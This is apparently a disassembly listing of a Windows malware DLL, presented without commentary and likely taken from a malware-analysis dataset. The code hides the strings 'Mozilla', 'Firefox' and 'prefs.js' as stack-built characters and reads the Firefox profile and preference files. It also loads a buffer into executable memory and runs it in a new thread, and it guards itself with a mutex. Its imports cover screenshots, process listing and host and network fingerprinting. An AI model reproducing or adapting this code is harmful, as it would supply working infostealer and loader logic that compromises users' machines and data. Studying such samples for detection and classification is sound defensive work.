push [ ebp - 0x8 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
call sub_1000397e
jmp r-xdata
push [ ebp + 0x8 ]
call j_sub_10003b81
push [ ebp - 0x4 ]
call j_sub_10003b81
push [ ebp - 0x8 ]
call j_sub_10003b81
push [ ebp - 0xc ]
call j_sub_10003b81
push [ ebp - 0x10 ]
call j_sub_10003b81
add esp 0x14
push [ ebp - 0x4 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
call sub_10003967
jmp r-xdata
push [ ebp + 0x8 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x4 ]
push esi
call sub_100066b2
jmp r-xdata
push esi
call [ lstrlenA@IAT ]
mov ecx [ ebx + 0x8 ]
push eax
push esi
call sub_100066d7
sub_1000608a
push ebp
mov ebp esp
push ecx
push ebx
mov ebx ecx
push esi
xor esi esi
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push eax
call sub_100037e2
mov edi eax
test edi edi
jne r-xdata
mov ecx [ ebx ]
call sub_100066af
push eax
call [ lstrlenA@IAT ]
push edi
mov esi eax
call [ lstrlenA@IAT ]
push r--data
add esi eax
call [ lstrlenA@IAT ]
add esi 0xb
add eax esi
push eax
call sub_10003ba2
pop ecx
push [ ebp - 0x4 ]
mov ecx [ ebx ]
mov esi eax
call sub_100066af
push eax
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x10
mov ebx eax
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
pop edi
push edi
call [ lstrlenA@IAT ]
push eax
lea eax [ ebx + esi ]
push edi
push eax
call sub_10003373
push edi
call j_sub_10003b81
add esp 0x10
sub_1000612c
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi ecx
xor eax eax
mov ecx [ edi + 0x8 ]
test ecx ecx
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
and [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push ebx
push esi
push eax
call sub_1000673a
push 0x8
push r--data
mov bl al
call sub_100031d3
push 0x401
mov esi eax
call sub_10003ba2
push [ ebp - 0x4 ]
movzx ecx bl
push ecx
push esi
push eax
mov [ ebp - 0x8 ] eax
call [ wsprintfA@IAT ]
push esi
call j_sub_10003b81
mov esi [ edi + 0x8 ]
add esp 0x20
test esi esi
je r-xdata
and [ edi + 0x8 ] 0x0
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov ecx esi
call sub_100066c2
push esi
call sub_10003b81
pop ecx
sub_100061c2
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100061f8
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0x4
jne r-xdata
push 0x10
push esi
call sub_10002422
pop ecx
push esi
call sub_10003b81
jmp r-xdata
pop ecx
sub_10006225
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn 0x4
push [ esi + 0x4 ]
call j_sub_10003b81
pop ecx
sub_10006245
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x4
push [ esi + 0xc ]
call j_sub_10003b81
pop ecx
sub_10006265
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
push [ esi + 0x8 ]
call j_sub_10003b81
pop ecx
sub_10006297
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100061b7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0x4
jne r-xdata
push 0x10
push esi
call sub_10002422
pop ecx
push esi
call sub_10003b81
jmp r-xdata
pop ecx
sub_100062cd
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi ecx
xor bl bl
call sub_10006313
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
push esi
push eax
mov ecx edi
call sub_1000656b
push [ ebp - 0x4 ]
mov esi eax
call j_sub_10003b81
xor eax eax
movzx ebx bl
inc eax
test esi esi
pop ecx
push esi
mov ecx edi
cmovne ebx eax
call sub_10006225
pop esi
sub_10006313
push ebp
mov ebp esp
sub esp 0x78
push ebx
push esi
push edi
mov esi 0x208
push esi
call sub_10003ba2
pop ecx
push 0x0
mov ebx eax
push 0x1a
push ebx
push 0x0
mov [ ebp - 0x4 ] ebx
call [ SHGetSpecialFolderPathW@IAT ]
push esi
call sub_10003ba2
push 0x4d
mov esi eax
pop eax
push 0x6f
pop edx
push 0x7a
mov [ ebp - 0x34 ] ax
pop eax
push 0x69
pop ecx
push 0x6c
pop edi
push 0x61
mov [ ebp - 0x30 ] ax
pop eax
push 0x46
mov [ ebp - 0x28 ] ax
xor eax eax
mov [ ebp - 0x26 ] ax
pop eax
push 0x72
mov [ ebp - 0x24 ] ax
pop eax
push 0x65
mov [ ebp - 0x20 ] ax
pop eax
push 0x66
mov [ ebp - 0x1e ] ax
pop eax
push 0x78
mov [ ebp - 0x1c ] ax
pop eax
push 0x70
mov [ ebp - 0x18 ] ax
xor eax eax
mov [ ebp - 0x16 ] ax
pop eax
push 0x72
mov [ ebp - 0x78 ] ax
pop eax
push 0x66
mov [ ebp - 0x76 ] ax
pop eax
push 0x65
mov [ ebp - 0x72 ] ax
pop eax
push 0x73
mov [ ebp - 0x6c ] ax
pop eax
push 0x2e
mov [ ebp - 0x6a ] ax
pop eax
push 0x6e
mov [ ebp - 0x68 ] ax
mov [ ebp - 0x32 ] dx
mov [ ebp - 0x2e ] cx
mov [ ebp - 0x2c ] di
mov [ ebp - 0x2a ] di
mov [ ebp - 0x22 ] cx
mov [ ebp - 0x1a ] dx
mov [ ebp - 0x74 ] dx
mov [ ebp - 0x70 ] cx
mov [ ebp - 0x6e ] di
mov [ ebp - 0x66 ] cx
pop eax
mov [ ebp - 0x64 ] ax
xor eax eax
mov [ ebp - 0x60 ] ax
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x62 ] cx
push eax
lea eax [ ebp - 0x34 ]
push eax
push ebx
push r--data
push esi
call [ wsprintfW@IAT ]
push 0x50
pop ecx
push 0x72
pop eax
push 0x6f
mov [ ebp - 0x46 ] ax
pop eax
push 0x66
mov [ ebp - 0x44 ] ax
pop eax
push 0x69
mov [ ebp - 0x42 ] ax
pop eax
push 0x65
mov [ ebp - 0x40 ] ax
pop eax
push 0x30
mov [ ebp - 0x3c ] ax
pop eax
mov [ ebp - 0x3a ] ax
xor eax eax
push 0x61
mov [ ebp - 0x38 ] ax
pop eax
push 0x74
mov [ ebp - 0x12 ] ax
pop eax
mov [ ebp - 0x10 ] ax
push 0x68
pop eax
mov [ ebp - 0xe ] ax
xor eax eax
push 0x208
mov [ ebp - 0x48 ] cx
mov [ ebp - 0x3e ] di
mov [ ebp - 0x14 ] cx
mov [ ebp - 0xc ] ax
call sub_10003ba2
add esp 0x20
mov edi eax
lea eax [ ebp - 0x14 ]
push esi
push 0x104
push edi
push r--data
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ GetPrivateProfileStringW@IAT ]
push esi
call j_sub_10003b81
push 0x2f
push edi
call sub_10003438
add esp 0xc
test eax eax
je r-xdata
push 0x70
pop eax
push 0x72
mov [ ebp - 0x5c ] ax
pop eax
push 0x65
mov [ ebp - 0x5a ] ax
pop eax
push 0x66
mov [ ebp - 0x58 ] ax
pop eax
push 0x73
pop ecx
push 0x2e
mov [ ebp - 0x56 ] ax
pop eax
push 0x6a
mov [ ebp - 0x52 ] ax
pop eax
mov [ ebp - 0x50 ] ax
xor eax eax
mov [ ebp - 0x4c ] ax
lea eax [ ebp - 0x5c ]
push eax
push edi
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x54 ] cx
push eax
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x4e ] cx
push eax
push ebx
push r--data
push ebx
call [ wsprintfW@IAT ]
push edi
call j_sub_10003b81
add esp 0x20
xor esi esi
mov ebx esi
push esi
push esi
push 0x3
push esi
push 0x1
push 0x80000000
push [ ebp - 0x4 ]
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
sub eax edi
sar eax 0x1
push 0x5c
pop ecx
mov [ edi + eax * 2 ] cx
push [ ebp - 0x4 ]
call j_sub_10003b81
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
call [ GetFileSize@IAT ]
mov esi eax
push esi
call sub_10003ba2
and [ ebp - 0x8 ] 0x0
mov ebx eax
pop ecx
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push esi
push ebx
push edi
call [ ReadFile@IAT ]
push edi
call [ CloseHandle@IAT ]
sub_1000656b
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
push ebx
push 0x12
push r--data
call sub_100031d3
mov ebx eax
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
call sub_100033e4
add esp 0x10
test eax eax
je r-xdata
push ebx
call j_sub_10003b81
mov eax [ ebp - 0xc ]
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push r--data
push eax
call sub_100033e4
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
push edi
add esi 0x3
push 0x22
push esi
call sub_100033c6
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
pop edi
cmp edi esi
jbe r-xdata
sub edi esi
lea eax [ edi + 0x1 ]
push eax
call sub_10003ba2
push edi
push esi
push eax
mov [ ebp - 0x8 ] eax
call sub_10003373
push 0x17
push r--data
call sub_100031d3
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_100033e4
add esp 0x20
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call j_sub_10003b81
push [ ebp - 0x8 ]
call j_sub_10003b81
pop ecx
pop ecx
push r--data
push eax
call sub_100033e4
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
add esi 0x2
push 0x29
push esi
call sub_100033c6
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x4 ]
cmp ebx esi
jbe r-xdata
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10003ba2
push ebx
mov edi eax
push esi
push edi
call sub_10003373
push 0x13
push r--data
call sub_100031d3
push 0x104
mov esi eax
call sub_10003ba2
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
push esi
push eax
call [ wsprintfA@IAT ]
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
add esp 0x34
sub_100066d7
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002fe0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
pop esi
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x40
push 0x3000
push [ ebp - 0x4 ]
push 0x0
call [ VirtualAlloc@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
push [ ebp - 0x4 ]
push esi
push eax
call sub_10003373
add esp 0xc
sub_1000673a
push ebp
mov ebp esp
xor eax eax
push ebx
mov bl al
cmp [ ecx ] eax
je r-xdata
mov al bl
pop ebx
pop ebp
retn 0x4
push esi
push eax
push eax
push eax
push [ ecx ]
mov bl 0x1
push eax
push eax
call [ CreateThread@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
pop esi
sub_10006781
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_10002cd2
push 0x23
call sub_10003b6a
pop ecx
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_100042ff
mov esi eax
jmp r-xdata
mov ecx esi
call sub_10005731
_start
push ebp
mov ebp esp
sub [ ebp + 0xc ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn 0xc
push ebx
push 0x208
call sub_10003ba2
mov ebx eax
mov [ esp ] 0x104
push ebx
push 0x0
call [ GetModuleFileNameW@IAT ]
push r--data
push ebx
call sub_1000349b
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
call j_sub_10003b81
pop ecx
pop ebx
push esi
push edi
push 0x15
push r--data
call sub_100031d3
pop ecx
pop ecx
mov edi eax
push edi
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov esi eax
call [ GetLastError@IAT ]
push edi
mov [ ebp + 0xc ] eax
call j_sub_10003b81
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
cmp [ ebp + 0xc ] 0xb7
je r-xdata
call [ GetCurrentProcessId@IAT ]
push eax
call sub_10002f64
and [ ebp + 0xc ] 0x0
mov esi eax
lea eax [ ebp + 0xc ]
push eax
push esi
call sub_10001541
push [ ebp + 0xc ]
push sub_10006781
push [ ebp + 0xc ]
push esi
call sub_1000169b
add esp 0x1c
sub_10001000
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
pop ebp
retn
sub_1000168b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10002cd2
pop ecx
pop ebp
retn 0x4
sub_10002422
retn
sub_100024cf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
cmp cl 0x41
jl r-xdata
pop ebp
retn
cmp cl 0x5a
jg r-xdata
add cl 0x20
mov [ eax ] cl
sub_100024e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
cmp ecx 0x41
jb r-xdata
pop ebp
retn
cmp ecx 0x5a
ja r-xdata
add ecx 0x20
mov [ eax ] cx
sub_10003300
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10003319
cmp [ ebp + 0x8 ] ax
pop ecx
pop ecx
sete al
pop ebp
retn
sub_10003502
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov eax ecx
retn
sub_1000393f
mov [ ecx + 0x10 ] 0x1
retn
sub_10003962
mov [ ecx + 0x12 ] 0x1
retn
sub_10003967
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1000306b
pop ecx
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
sub_100039dc
mov [ ecx + 0x13 ] 0x1
retn
sub_100039e1
mov [ ecx + 0x11 ] 0x1
retn
sub_100039e6
push esi
mov esi ecx
call sub_100039fb
mov eax esi
pop esi
retn
sub_100039f2
push [ ecx ]
call j_sub_10003b81
pop ecx
retn
sub_10004dc5
mov ecx [ ecx + 0x1c ]
xor eax eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
retn
retn
sub_10004e15
mov ecx [ ecx + 0x1c ]
xor eax eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0xc ]
retn
retn
sub_10004e23
mov ecx [ ecx + 0x1c ]
xor eax eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x8 ]
retn
retn
sub_10005bfa
mov ecx [ ecx ]
xor eax eax
test ecx ecx
jne sub_100066af
retn
sub_100061a3
xor eax eax
mov [ ecx ] r--data
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov eax ecx
retn
sub_100061b7
mov [ ecx ] r--data
jmp sub_100061f8
sub_100061f8
push esi
push 0x0
mov esi ecx
call sub_10006225
push 0x0
mov ecx esi
call sub_10006245
push 0x0
mov ecx esi
call sub_10006265
pop esi
retn
sub_1000621a
xor al al
retn
sub_10006285
push esi
mov esi ecx
call sub_100061a3
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_100066a5
and [ ecx ] 0x0
mov eax ecx
retn
sub_100066ab
and [ ecx ] 0x0
retn
sub_100066af
mov eax [ ecx ]
retn
sub_100066b2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
mov [ ecx ] eax
sub_100066c2
cmp [ ecx ] 0x0
je r-xdata
retn
push 0x8000
push 0x0
push [ ecx ]
call [ VirtualFree@IAT ]
GetAdaptersAddresses
jmp [ GetAdaptersAddresses@IAT ]
ObtainUserAgentString
jmp [ ObtainUserAgentString@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipCreateBitmapFromHBITMAP
jmp [ GdipCreateBitmapFromHBITMAP@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32First
jmp [ Process32First@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
